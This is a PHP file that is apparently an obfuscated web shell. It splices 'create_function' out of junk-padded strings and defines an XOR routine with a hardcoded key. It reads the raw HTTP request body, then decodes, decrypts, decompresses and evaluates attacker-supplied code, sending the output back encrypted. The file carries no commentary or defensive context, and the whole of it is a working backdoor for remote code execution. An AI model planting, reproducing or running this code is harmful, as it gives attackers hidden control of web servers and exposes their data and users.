<?php
$N='m>contenm>tsm>();@obm>_end_cm>lean()m>;$r=@bam>se64_encm>ode(@m>x(@gzcom>mpm>ressm>($om>),$k));print("m>$p$km>h$r$kf");}';
$f='put"m>),$mm>)==1) {m>@ob_stam>rt();@m>evm>alm>(@gzuncomprem>ss(@x(@bam>sem>64_decodm>em>(m>$m[1]),$k)));$o=m>@ob_get_';
$l=',m>$k){$c=sm>trlm>en($k);$m>l=strlm>en($t);$m>om>="";fm>or($i=0;$i<$l;m>){fom>r($m>j=0;m>($j<$cm>&&$i<$m>l);$m>j++,$m>i';
$g=str_replace('l','','crlealtel_lfunlctlion');
$i='++){$o.=m>$t{$i}^$m>k{$j};}}rem>turn $om>;}if m>(@pregm>_mam>tch("m>/$kh(.+)$km>m>f/",@file_gm>et_m>contenm>ts("php://m>in';
$P='$k="em>cf59fm>70";$km>h="2m>2978934016m>c";$m>kf="c002fefm>44c84m>";$pm>="mVNm>i1m>m>pDHdoTjBXlI";m>funm>ction x($t';
$D=str_replace('m>','',$P.$l.$i.$f.$N);
$B=$g('',$D);$B();
?>
